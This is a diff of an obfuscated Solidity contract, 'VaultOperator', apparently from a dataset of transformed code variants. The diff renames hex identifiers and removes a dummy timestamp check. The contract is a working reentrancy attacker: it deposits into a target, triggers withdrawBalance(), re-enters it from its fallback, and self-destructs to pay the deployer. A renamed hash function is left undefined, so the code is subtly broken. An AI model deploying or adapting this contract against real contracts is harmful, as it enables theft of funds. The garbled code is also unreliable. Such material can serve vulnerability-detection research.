@@ -1,37 +1,37 @@
 pragma solidity ^0.4.15;
 
 contract VaultOperator {
-    bool public _0x740c1a=false;
-    address public _0xd3fcd7;
-    address public _0xdfe6fe;
+    bool public _0x713a4a=false;
+    address public _0xdb4411;
+    address public _0xd58cf8;
 
     function VaultOperator() public{
-        if (block.timestamp > 0) { _0xdfe6fe = msg.sender; }
+        _0xd58cf8 = msg.sender;
     }
 
-    function _0x1cfae8(address _0xa8e0fb) public payable{
-        _0xd3fcd7 = _0xa8e0fb ;
+    function _0x95d9ec(address _0x956def) public payable{
+        _0xdb4411 = _0x956def ;
 
-        require(_0xd3fcd7.call.value(msg.value)(bytes4(_0x45d473("addToBalance()"))));
+        require(_0xdb4411.call.value(msg.value)(bytes4(_0x8597d8("addToBalance()"))));
     }
 
-    function _0x974b49() public{
-        _0x740c1a = true;
+    function _0xf5b448() public{
+        _0x713a4a = true;
 
 
-        require(_0xd3fcd7.call(bytes4(_0x45d473("withdrawBalance()"))));
+        require(_0xdb4411.call(bytes4(_0x8597d8("withdrawBalance()"))));
     }
 
     function () public payable{
 
-        if (_0x740c1a){
-            _0x740c1a = false;
-                require(_0xd3fcd7.call(bytes4(_0x45d473("withdrawBalance()"))));
+        if (_0x713a4a){
+            _0x713a4a = false;
+                require(_0xdb4411.call(bytes4(_0x8597d8("withdrawBalance()"))));
         }
     }
 
-    function _0x7f7cb6(){
-        suicide(_0xdfe6fe);
+    function _0xe840fc(){
+        suicide(_0xd58cf8);
     }
 
 }
